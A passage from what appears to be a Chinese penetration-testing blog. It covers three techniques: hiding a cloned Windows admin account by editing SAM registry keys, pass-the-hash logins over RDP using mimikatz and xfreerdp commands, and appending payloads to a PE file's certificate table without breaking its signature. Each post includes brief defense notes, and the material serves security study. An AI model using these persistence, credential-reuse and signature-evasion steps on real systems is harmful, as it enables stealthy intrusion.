<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-3.png" alt="Alt text"></p>

<h3 id="3导出注册表">3、导出注册表</h3>

<p>在注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户test$</p>

<p>获取默认类型为<code class="language-plaintext highlighter-rouge">0x3ea</code></p>

<p>将注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$</code>导出为<code class="language-plaintext highlighter-rouge">1.reg</code></p>

<p>在注册表下能够找到对应类型名称的注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-4.png" alt="Alt text"></p>

<p>右键将该键导出为<code class="language-plaintext highlighter-rouge">2.reg</code>，保存的文件信息如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-5.png" alt="Alt text"></p>

<p>默认情况下，管理员帐户Administrator对应的注册表键值为<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code></p>

<p>同样，右键将该键导出为<code class="language-plaintext highlighter-rouge">3.reg</code></p>

<p>将注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>下键F的值替换为<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键F的值，即2.reg中键F的值替换成3.reg中键F的值</p>

<p>替换后，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-6.png" alt="Alt text"></p>

<h3 id="4命令行删除特殊帐户">4、命令行删除特殊帐户</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user test$ /del
</code></pre></div></div>

<h3 id="5导入reg文件">5、导入reg文件</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regedit /s 1.reg
regedit /s 2.reg
</code></pre></div></div>

<p>隐藏账户制做完成，控制面板不存在帐户test$</p>

<p>通过net user无法列出该帐户</p>

<p>计算机管理-本地用户和组-用户也无法列出该帐户</p>

<p>但可通过如下方式查看：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user test$
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-7.png" alt="Alt text"></p>

<p>无法通过<code class="language-plaintext highlighter-rouge">net user test$ /del</code>删除该用户，提示用户不属于此组，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-8.png" alt="Alt text"></p>

<p><strong>删除方法：</strong></p>

<p>删除注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值(共有两处)</p>

<p><strong>注：</strong></p>

<p>工具HideAdmin能自动实现以上的创建和删除操作</p>

<h2 id="0x03-编写脚本实现思路">0x03 编写脚本实现思路</h2>
<hr>

<p>采用powershell脚本实现的两种思路：</p>

<h3 id="1对注册表添加管理员帐户的编辑权限">1、对注册表添加管理员帐户的编辑权限</h3>

<p>使用regini注册ini文件为注册表及其子键赋予权限</p>

<p><strong>注：</strong></p>

<p>Powershell通过<code class="language-plaintext highlighter-rouge">Set-Acl</code>为注册表赋予权限，示例代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:SAM\SAM\
$person = [System.Security.Principal.NTAccount]"Administrators"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
$propagation = [System.Security.AccessControl.PropagationFlags]"NoPropagateInherit"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.ResetAccessRule($rule)
Set-Acl HKLM:SAM\SAM\Domains\Account\Users\Names $acl
</code></pre></div></div>

<p>但不支持对子键的权限分配，因此不采用该方法</p>

<p>以下内容保存为a.ini:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SAM\SAM\* [1 17]
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">*</code>代表枚举所有子键</p>

<p>1代表Administrators 完全访问</p>

<p>17代表System 完全访问</p>

<p>详细权限说明可通过cmd执行<code class="language-plaintext highlighter-rouge">regini</code>获取帮助，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/3-1.png" alt="Alt text"></p>

<p>通过regini注册:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regini  a.ini
</code></pre></div></div>

<p>Evilcg就是通过这种方式实现的，脚本地址：</p>

<p>https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1</p>

<p><strong>注：</strong></p>

<p>使用<code class="language-plaintext highlighter-rouge">*</code>需要system权限,但只把相关的列举出来，只需要管理员权限即可，例如：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]
</code></pre></div></div>

<h3 id="2直接获得system权限">2、直接获得System权限</h3>

<p>我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧——Token窃取与利用》</a>介绍过通过token复制获得system权限的方法</p>

<p>所以，可以先获得System权限，进而拥有对注册表的编辑权限</p>

<p>简单的方式，通过<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation.ps1</code>，地址如下：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</p>

<p>但我在测试时发现了一个bug，使用<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"</code>无法将当前权限切换为System权限</p>

<p>但可以使用<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"</code>新打开一个System权限的进程</p>

<p>接下来，就是编写脚本实现注册表的导出替换功能：</p>

<ul>
  <li>新建测试帐户</li>
  <li>将注册表导出到temp目录，进行替换</li>
  <li>删除特殊帐户</li>
  <li>导入注册表文件</li>
</ul>

<p>我的实现方法参照了Evilcg的最初始版本，做了细节上的优化，下载地址：</p>

<p>https://github.com/3gstudent/Windows-User-Clone</p>

<h2 id="0x04-结合远程桌面多用户登录的利用思路">0x04 结合远程桌面多用户登录的利用思路</h2>
<hr>

<p>通过以上的介绍，可得出该方法的优点：</p>

<p><strong>通过克隆的方式能够继承原帐户的权限</strong></p>

<p>在利用上存在以下需要注意的问题：</p>

<h3 id="1复制管理员帐户administrator">1、复制管理员帐户Administrator</h3>

<p>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态</p>

<h3 id="2复制已有帐户">2、复制已有帐户</h3>

<p>在3389远程登录的利用上存在相同帐户的冲突关系</p>

<p>通过cmd开启本机的3389远程登录功能：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
</code></pre></div></div>

<p>利用以上方法，克隆帐户a的权限，建立隐藏帐户aaa$</p>

<p>如果系统当前登录帐号为a，那么使用隐藏帐户aaa$登录的话，会系统被识别为帐户a，导致帐户a下线</p>

<h3 id="3新建帐户再复制">3、新建帐户再复制</h3>

<p>进一步，大胆的思考</p>

<p>新建管理员帐户b，克隆帐户b，建立隐藏账户bbb$</p>

<p>删除管理员帐户b，隐藏账户bbb$仍然有效</p>

<h3 id="4原帐户的维持">4、原帐户的维持</h3>

<p>再进一步</p>

<p>克隆帐户a的权限，建立隐藏帐户aaa$</p>

<p>修改帐户a的密码，隐藏帐户aaa$仍然有效</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>针对隐藏帐户的利用，查看注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>即可</p>

<p>当然，默认管理员权限无法查看，需要分配权限或是提升至Sytem权限</p>

<p>隐藏帐户的登录记录，可通过查看日志获取</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了隐藏帐户的相关利用技巧，如果应用于远程桌面的多用户登录，隐蔽性会大大提高，站在防御的角度，分享出该利用方法，帮助大家更好的认识和防御。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 10, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Pass the Hash with Remote Desktop</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，如果获得了某个用户的NTLM hash，我们可以尝试使用Pass the hash的方法对WMI和SMB服务进行登录，那么，Pass the hash能否用于远程桌面呢？这其中有什么限制条件呢？本文将要进行测试并总结。</p>

<p>关于Pass the hash的利用可参考之前的文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">《域渗透——Pass The Hash的实现》</a></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Restricted Admin mode介绍</li>
  <li>Pass the Hash with Remote Desktop的适用条件</li>
  <li>Pass the Hash with Remote Desktop的实现方法</li>
</ul>

<h2 id="0x02-restricted-admin-mode简介">0x02 Restricted Admin mode简介</h2>
<hr>

<p>官方说明：</p>

<p>https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/</p>

<p>本节参照官方说明，加入个人理解，如果有误，欢迎纠正</p>

<p>Restricted Admin mode，直译为受限管理模式，主要功能是使得凭据不会暴露在目标系统中</p>

<h3 id="适用系统">适用系统</h3>

<ul>
  <li>Windows 8.1和Windows Server 2012 R2默认支持该功能</li>
  <li>Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</li>
</ul>

<p><strong>注：</strong></p>

<p>相关资料可参考：</p>

<p>https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997</p>

<p>https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro</p>

<h3 id="开启restricted-admin-mode的方法">开启Restricted Admin mode的方法</h3>

<h4 id="方法1-安装补丁3126593">方法1: 安装补丁3126593</h4>

<p>实现原理同下文的方法2(修改注册表)</p>

<p>参考链接：</p>

<p>https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro</p>

<h4 id="方法2-修改注册表">方法2： 修改注册表</h4>

<p>位置：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code></p>

<p>新建<code class="language-plaintext highlighter-rouge">DWORD</code>键值<code class="language-plaintext highlighter-rouge">DisableRestrictedAdmin</code>，值为<code class="language-plaintext highlighter-rouge">0</code>，代表开启;值为<code class="language-plaintext highlighter-rouge">1</code>，代表关闭</p>

<p>对应命令行开启的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
</code></pre></div></div>

<h3 id="使用restricted-admin-mode">使用Restricted Admin mode</h3>

<p>客户端命令行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mstsc.exe /restrictedadmin
</code></pre></div></div>

<p>如果当前系统不支持Restricted Admin mode，执行后弹出远程桌面的参数说明，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-6/2-1.png" alt="Alt text"></p>

<p>如果当前系统支持Restricted Admin mode，执行后弹出远程桌面的登录界面，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-6/2-2.png" alt="Alt text"></p>

<p>值得注意的是，Restricted Admin mode使用当前Windows登录凭据，不需要输入口令，直接登录即可</p>

<p><strong>注：</strong></p>

<p>正是这项功能使得Pass the hash的利用有了可能</p>

<p>更进一步，Pass the Hash with Remote Desktop的前提就是系统支持Restricted Admin mode</p>

<p>具体的说，Server需要开启Restricted Admin mode，Client需要支持Restricted Admin mode</p>

<p><strong>注：</strong></p>

<p>一些资料提到Pass the Hash with Remote Desktop适用于Windows 8.1和Windows Server 2012 R2，这个结论并不确切，准确的说，Windows 7和Windows Server 2008 R2安装补丁后同样适用</p>

<h2 id="0x03-pass-the-hash-with-remote-desktop的实现方法">0x03 Pass the Hash with Remote Desktop的实现方法</h2>
<hr>

<p>测试环境：</p>

<p>Server：</p>

<ul>
  <li>OS: Server2012 R2</li>
  <li>IP: 192.168.62.136</li>
  <li>Computer Name: remoteserver</li>
  <li>User Name: administrator</li>
  <li>NTLM hash: d25ecd13fddbb542d2e16da4f9e0333d</li>
  <li>开启Restricted Admin mode</li>
</ul>

<p>Client:</p>

<ul>
  <li>支持Restricted Admin mode</li>
</ul>

<h3 id="方法1-mimikatz">方法1： mimikatz</h3>

<p>实际上为<code class="language-plaintext highlighter-rouge">Overpass-the-hash</code></p>

<p>需要管理员权限</p>

<p>mimikatz命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d "/run:mstsc.exe /restrictedadmin"
</code></pre></div></div>

<p>执行后弹出远程登录界面，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-6/3-1.png" alt="Alt text"></p>

<p>选择<code class="language-plaintext highlighter-rouge">连接</code>，成功实现远程登录</p>

<h3 id="方法2-freerdp">方法2： FreeRDP</h3>

<p>下载地址：</p>

<p>https://github.com/FreeRDP</p>

<p>可供参考的文章：</p>

<p>https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/</p>

<p>https://www.kali.org/penetration-testing/passing-hash-remote-desktop/</p>

<p>FreeRDP实现了远程桌面协议，支持传入hash</p>

<p>支持Linux、Windows和MAC，下载地址如下：</p>

<p>https://github.com/FreeRDP/FreeRDP/wiki/PreBuilds</p>

<p>linux下使用明文远程登录的参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:administrator /p:test123! /v:192.168.62.136 /cert-ignore
</code></pre></div></div>

<p>测试成功</p>

<p>linux下使用hash远程登录的参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.136 /cert-ignore
</code></pre></div></div>

<p>测试失败</p>

<p>Windows下也是同样的测试结果</p>

<p>猜测FreeRDP移除了该功能，其他人也有同样的测试结果，链接如下：</p>

<p>https://nullsec.us/rdp-sessions-with-xfreerdp-using-pth/</p>

<p>https://twitter.com/egyp7/status/776053410231558148</p>

<p><strong>补充：</strong></p>

<p>包含pth功能的旧版FreeRDP的的下载地址：</p>

<p>https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz</p>

<p>需要重新编译，支持pth参数</p>

<h2 id="0x04-防御检测">0x04 防御检测</h2>
<hr>

<p>Restricted Admin mode本来是为了提高系统的安全性，但是却支持了Pass the Hash的利用</p>

<p>所以在防御上，针对Pass the Hash的利用进行防御就好，开启Restricted Admin mode有助于提高系统的安全性</p>

<p>可参考微软官方文档，地址如下：</p>

<p>http://www.microsoft.com/en-us/download/details.aspx?id=36036</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文对Pass the Hash with Remote Desktop的方法进行了分析，找到了其中的限制条件（<strong>Server需要开启Restricted Admin mode，Client需要支持Restricted Admin mode</strong>），对Restricted Admin mode的关键部分进行了说明</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May  6, 2018
  </div>

  
</article><article class="post">
  <h1>隐写技巧——在PE文件的数字证书中隐藏Payload</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>为了验证PE文件的来源和完整性，常常会为PE文件添加数字证书。Windows系统下默认会对一些重要文件添加微软的数字签名，如ntdll.dll。恶意文件分析系统在对PE文件的静态分析过程中，如果PE文件有数字签名，则对签名进行验证。若数字签名验证通过，则不再对其进行后续分析。这样做主要考虑的是降低误报，以及减少服务器资源消耗。如果能在保证数字签名有效的前提下，在PE文件中隐藏Payload，那么这种隐写方式将会非常隐蔽。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>
<p>来自Deep Instinct Research Team的<code class="language-plaintext highlighter-rouge">Tom Nipravsky</code>在BlackHat2016的议题<code class="language-plaintext highlighter-rouge">《Certificate Bypass: Hiding and Executing Malware from a Digitally Signed Executable》</code>介绍了这个方法，并且实现了一个Reflective PE Loader，用来加载隐藏在PE文件数字证书中的Payload，值得学习。</p>

<p><strong>议题PDF下载地址：</strong></p>

<p>https://www.blackhat.com/docs/us-16/materials/us-16-Nipravsky-Certificate-Bypass-Hiding-And-Executing-Malware-From-A-Digitally-Signed-Executable-wp.pdf</p>

<p>本文将会更加详细的介绍如何实现在保证数字签名有效的前提下，向PE文件中隐藏Payload。</p>

<h2 id="0x02-pe文件格式和数字签名格式">0x02 PE文件格式和数字签名格式</h2>
<hr>
<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/1.png" alt="Alt text"></p>

<blockquote>
  <p>图1引用自Windows Authenticode Portable Executable Signature Format
https://msdn.microsoft.com/en-us/windows/hardware/gg463180.aspx</p>
</blockquote>

<p><strong>签名过程：</strong></p>

<ul>
  <li>计算PE文件hash</li>
  <li>根据hash生成数字证书</li>
  <li>数字签名添加在文件末尾，这部分称作<code class="language-plaintext highlighter-rouge">Certificate Table</code></li>
</ul>

<p><strong>计算文件hash的步骤：</strong></p>

<ol>
  <li>Load the image header into memory.</li>
  <li>Initialize a hash algorithm context.</li>
  <li>Hash the image header from its base to immediately before the start of the checksum address, as specified in Optional Header Windows-Specific Fields.</li>
  <li>Skip over the checksum, which is a 4-byte field.</li>
  <li>Hash everything from the end of the checksum field to immediately before the start of the Certificate Table entry, as specified in Optional Header Data Directories.</li>
  <li>Get the Attribute Certificate Table address and size from the Certificate Table entry. For details, see section 5.7 of the PE/COFF specification.</li>
  <li>Exclude the Certificate Table entry from the calculation and hash everything from the end of the Certificate Table entry to the end of image header, including Section Table (headers).The Certificate Table entry is 8 bytes long, as specified in Optional Header Data Directories.</li>
  <li>Create a counter called SUM_OF_BYTES_HASHED, which is not part of the signature. Set this counter to the SizeOfHeaders field, as specified in Optional Header Windows-Specific Field.</li>
  <li>Build a temporary table of pointers to all of the section headers in the image. The NumberOfSections field of COFF File Header indicates how big the table should be. Do not include any section headers in the table whose SizeOfRawData field is zero.</li>
  <li>Using the PointerToRawData field (offset 20) in the referenced SectionHeader structure as a key, arrange the table’s elements in ascending order. In other words, sort the section headers in ascending order according to the disk-file offset of the sections.</li>
  <li>Walk through the sorted table, load the corresponding section into memory, and hash the entire section. Use the SizeOfRawData field in the SectionHeader structure to determine the amount of data to hash.</li>
  <li>Add the section’s SizeOfRawData value to SUM_OF_BYTES_HASHED.</li>
  <li>Repeat steps 11 and 12 for all of the sections in the sorted table.</li>
  <li>Create a value called FILE_SIZE, which is not part of the signature. Set this value to the image’s file size, acquired from the underlying file system. If FILE_SIZE is greater than SUM_OF_BYTES_HASHED, the file contains extra data that must be added to the hash. This data begins at the SUM_OF_BYTES_HASHED file offset, and its length is:
(File Size) – ((Size of AttributeCertificateTable) + SUM_OF_BYTES_HASHED)</li>
</ol>

<blockquote>
  <p>引用自Windows Authenticode Portable Executable Signature Format
https://msdn.microsoft.com/en-us/windows/hardware/gg463180.aspx</p>
</blockquote>

<p>如果修改了文件内容，那么计算出的文件hash就会改变，导致数字证书无法通过验证，所以数字证书能够保证签名文件的完整性，但是在计算文件hash的算法上<strong>存在一个不足：</strong></p>

<p>计算文件hash并非对整个文件内容作计算（如计算文件hash的步骤4，以及图1中灰色背景的部分，目的是避免绑定的证书文件影响到hash值）</p>

<p><strong>更值得注意的是：</strong></p>

<p>在Certificate Table的尾部添加数据并不会影响计算出的文件hash，也就是说在Certificate Table尾部添加数据不会导致证书失效</p>

<p><strong>注：</strong></p>

<p>这个思路早在2009年由Aymeric Barthe@bartheph提出</p>

<p>https://blog.barthe.ph/2009/02/22/change-signed-executable/</p>

<p>当然，在证书尾部添加数据虽然不会影响计算出的文件hash，但会改变证书长度，所以在PE文件结构中保存证书长度的位置需要作相应修改（共2处），下面实例演示一种最直观的添加payload并修改证书长度的方法</p>

<h2 id="0x03-演示一">0x03 演示一</h2>
<hr>
<p><strong>测试文件：</strong></p>

<p>ntdll.dll</p>

<p>Win7 x64下默认位置为：C:\Windows\SysWOW64</p>

<p><strong>使用工具：</strong></p>

<p>CFF Explorer</p>

<p>Hex Editor</p>

<p>LordPE</p>

<h3 id="1定位certificate-size-in-certificate-table">1、定位Certificate Size in Certificate Table</h3>

<p>使用<code class="language-plaintext highlighter-rouge">CFF Explorer</code>查看dll结构，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-1.png" alt="Alt text"></p>

<p>可获得如下信息：</p>

<p>File Size: 1292592 bytes</p>

<p>PE   Size: 1277952 bytes</p>

<p>推断出：</p>

<p>Certificate Table的偏移地址为138000H(1277952)</p>

<p>Certificate Table的前四字节保存长度，大小应该为14640 bytes（1292592-1277952）</p>

<p>现在跳到偏移地址138000H,查看前四字节，验证推断</p>

<p>如图，前四字节为30390000,转换成实际长度为00003930H,即14640 bytes</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-2.png" alt="Alt text"></p>

<h3 id="2修改certificate-size-in-certificate-table">2、修改Certificate Size in Certificate Table</h3>

<p>测试待添加的payload为：1111111111，长度为10</p>

<p>显然，</p>

<p>New Size = Old Size + Payload Size</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	 = 14640 +10

	 = 14650

	 = 393aH
</code></pre></div></div>

<p>对应偏移地址138000H-138003的数据修改为3A390000,如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-3.png" alt="Alt text"></p>

<h3 id="3定位certificate-size-in-optional-header">3、定位Certificate Size in Optional Header</h3>

<p>使用<code class="language-plaintext highlighter-rouge">CFF Explorer</code>查看dll结构，选择Nt Headers-Optional Header-Data Directories [x],找到Security Directory Size项，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-4.png" alt="Alt text"></p>

<h3 id="4修改certificate-size-in-optional-header">4、修改Certificate Size in Optional Header</h3>

<p>00003930修改为0000393A，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-5.png" alt="Alt text"></p>

<p>保存文件，查看文件信息，签名失效（因为还没有添加payload）</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-6.png" alt="Alt text"></p>

<h3 id="5添加payload">5、添加payload</h3>

<p>使用<code class="language-plaintext highlighter-rouge">Hex Editor</code>在文件尾部添加payload</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-7.png" alt="Alt text"></p>

<p>保存后，签名成功识别，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-8.png" alt="Alt text"></p>

<h3 id="6修改pe文件校验和">6、修改PE文件校验和</h3>

<p>使用<code class="language-plaintext highlighter-rouge">LordPE</code>打开PE文件，如图，原文件的校验和为0013E00E</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-9.png" alt="Alt text"></p>

<p>点击”?”对其更新，如图，新的校验和为00142672</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-10.png" alt="Alt text"></p>

<p>使用<code class="language-plaintext highlighter-rouge">CFF Explorer</code>打开PE文件，选择Nt Headers-Optional Header，找到CheckSum项</p>

<p>原校验和为0013E00E，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-11.png" alt="Alt text"></p>

<p>修改为00142672，保存为ntdll(AddPayload).dll</p>

<p>使用<code class="language-plaintext highlighter-rouge">LordPE</code>验证校验和，成功</p>

<p>至此，在保证PE文件数字证书有效的前提下，成功在PE文件尾部添加Payload</p>

<p><strong>注：</strong></p>

<p>添加的payload长度需要满足为8的整数倍，否则会显示数字签名状态无效</p>

<h2 id="0x04-演示二">0x04 演示二</h2>
<hr>
<p>测试文件：aliide.sys</p>

<h3 id="1定位certificate-size-in-certificate-table-1">1、定位Certificate Size in Certificate Table</h3>

<p>如图，偏移地址2000H（8192）</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-12.png" alt="Alt text"></p>

<p>跳到偏移地址2000H,查看前四字节，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-13.png" alt="Alt text"></p>

<p>Certificate Size为00001c50H</p>

<h3 id="2修改certificate-size-in-certificate-table-1">2、修改Certificate Size in Certificate Table</h3>

<p>添加的payload为BBBBBBBBBB,10字节</p>

<p>00001c50H+10=00001c5AH</p>

<p>修改为5A1C0000，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-14.png" alt="Alt text"></p>

<h3 id="3定位certificate-size-in-optional-header-1">3、定位Certificate Size in Optional Header</h3>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-15.png" alt="Alt text"></p>

<h3 id="4修改certificate-size-in-optional-header-1">4、修改Certificate Size in Optional Header</h3>

<p>00001C50改为00001C5A</p>

<h3 id="5添加payload-1">5、添加payload</h3>

<p>尾部添加BBBBBBBBBB</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/3-16.png" alt="Alt text"></p>

<h3 id="6修改pe文件校验和-1">6、修改PE文件校验和</h3>

<p>000065ED改为0000B156</p>

<p>添加成功</p>

<p><strong>注：</strong></p>

<p>添加的payload长度需要满足为8的整数倍，否则会显示数字签名状态无效</p>

<h2 id="0x05-程序实现">0x05 程序实现</h2>
<hr>

<h3 id="1aymeric-barthebartheph的实现方法">1、Aymeric Barthe@bartheph的实现方法</h3>

<p><strong>开发语言：</strong>c++</p>

<p><strong>下载地址：</strong></p>

<p>https://blog.barthe.ph/download/2009/AppendPayLoad.tar.bz2</p>

<p>编译成功后，命令行执行：</p>

<p>AppendPayLoad.exe ntdll.dll payload.txt newntdll.dll</p>

<p><strong>参数说明：</strong></p>

<p>ntdll.dll：原PE文件</p>

<p>payload.txt：存储待添加的payload</p>

<p>newntdll.dll：新生成的文件</p>

<p>测试Payload添加成功，新生成文件的数字签名成功识别，程序有<strong>如下特点：</strong></p>

<p>1.payload在尾部自动填0补齐payload长度为8的倍数</p>

<p>如图，多了6个’00’，补齐长度</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/4-1.png" alt="Alt text"></p>

<p>2.未修改PE文件校验和</p>

<p>如图，PE文件校验和实际应该为00142684</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/4-2.png" alt="Alt text"></p>

<h3 id="2joakim-schicht的实现方法">2、Joakim Schicht的实现方法</h3>

<p><strong>开发语言：</strong>Autoit</p>

<p><strong>下载地址：</strong></p>

<p>http://reboot.pro/files/file/85-digitalsignaturetweaker/</p>

<p>界面如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-12/4-3.PNG" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>
<p>本文介绍了如何利用工具实现在保证数字签名有效的前提下，向PE文件中隐藏Payload。在掌握了修改方法后，编写程序实现自动修改不会很难。对于带有数字签名的PE文件，建议不要盲目相信。</p>

<h2 id="更新">更新</h2>
<hr>

<ul>
